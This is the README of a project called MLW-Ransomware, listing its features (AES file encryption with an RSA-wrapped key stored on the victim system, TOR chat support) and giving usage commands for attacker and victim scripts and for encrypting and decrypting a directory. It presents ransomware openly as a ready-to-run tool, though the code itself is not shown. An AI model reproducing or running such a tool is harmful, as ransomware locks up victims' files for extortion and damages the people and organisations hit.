# MLW-Ransomware
# Features
- Encrypt files using AES with random IV.
- RSA to encrypt AES key. Store key in victim system. 
- TOR chat support.

# How it Works
Run attack:
```
/bin/bash Bash/bashAttacker.sh
/bin/bash Bash/bashVictim.sh
```


Encrypt files:
```
python upcrans.py --encrypt --path .
```

Decrypt files:
```
python upcrans.py --decrypt --AESkey KEY.txt --RSAkey KEYRSA.txt
```
Where AESkey is the path generated when files are encrypted and RSAkey is the private key of RSA that is stored in BBDD.


